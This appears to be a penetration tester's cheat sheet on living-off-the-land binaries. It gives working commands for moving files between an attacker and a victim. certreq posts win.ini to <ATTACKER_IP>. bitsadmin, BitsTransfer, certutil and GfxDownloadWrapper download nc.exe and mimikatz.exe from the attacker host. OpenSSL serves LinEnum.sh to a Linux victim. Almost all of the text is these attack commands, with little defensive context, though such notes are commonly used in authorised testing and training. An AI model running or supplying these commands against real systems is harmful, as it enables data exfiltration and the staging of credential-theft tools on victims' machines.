# LOLBins GTFOBins
```table-of-contents
```
## Project Overview
- **Windows:** [LOLBAS Project](https://lolbas-project.github.io/) (Living Off The Land Binaries and Scripts). Look for `/download` or `/upload` tags.
- **Linux:** [GTFOBins](https://gtfobins.github.io/). Look for `+file download` or `+file upload` functions.
## Windows (LOLBAS)
### CertReq.exe (Upload/Exfiltration)
**1. Attacker (Listener)**
```shell
# Listen for the incoming POST request
sudo nc -lvnp 8000
```
**2. Victim (Sender)**
```powershell
# Sends win.ini to the attacker
certreq.exe -Post -config http://<ATTACKER_IP>:8000/ c:\windows\win.ini
```
**Note**: If `certreq` hangs or errors, the specific version might not support `-Post`.
### Bitsadmin (Download)
```powershell
# Deprecated but still present on many systems
bitsadmin /transfer wcb /priority foreground http://<ATTACKER_IP>/nc.exe C:\Users\Public\nc.exe
```
### PowerShell BitsTransfer (Download)
```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://<ATTACKER_IP>/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
### Certutil (Download)
```powershell
# -verifyctl: Verify certificate (abused to download)
# -split: Split embedded elements (saves to disk)
certutil.exe -verifyctl -split -f http://<ATTACKER_IP>/nc.exe
```
### Other LOLBins (Misplaced Trust)
#### GfxDownloadWrapper.exe (Intel Graphics)
```powershell
# Usage: Executable "URL" "Destination"
GfxDownloadWrapper.exe "http://<ATTACKER_IP>/mimikatz.exe" "C:\Temp\mimikatz.exe"
```
## Linux (GTFOBins)
### OpenSSL (Server-Client Transfer)
**1. Attacker (Setup Server)** 
```shell
# Generate Certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Start Server (Hosting LinEnum.sh)
# -quiet: Less verbose | -accept: Port
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < LinEnum.sh
```
**2. Victim (Client Download)** 
```shell
openssl s_client -connect <ATTACKER_IP>:80 -quiet > LinEnum.sh
```